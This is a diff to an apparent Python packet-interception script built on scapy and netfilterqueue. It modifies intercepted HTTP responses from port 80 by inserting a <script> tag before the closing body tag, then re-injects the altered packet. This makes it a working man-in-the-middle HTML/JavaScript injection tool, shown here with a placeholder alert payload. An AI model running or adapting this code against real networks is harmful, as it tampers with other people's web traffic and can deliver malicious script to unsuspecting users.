@@ -27,7 +27,10 @@ def spoofed_packet(packets):
         # Source Port
         elif scapy_packet[scapy.TCP].sport == 80:
             print("[+] Response")
-            print(scapy_packet.show())# in the spoofed functionality.
+            # Injecting HTML/JavaScript Code in the response field aka the html code of the website
+            loader_modifier = scapy_packet[scapy.Raw].load.replace("</body>", "<script>alert('test');</script></body>")
+            new_packet = loader(scapy_packet, loader_modifier)
+            packets.set_payload(str(new_packet))
     packets.accept()  # accept packets
 
 queue = netfilterqueue.NetfilterQueue()  # Creating instance of netfilterqueue object
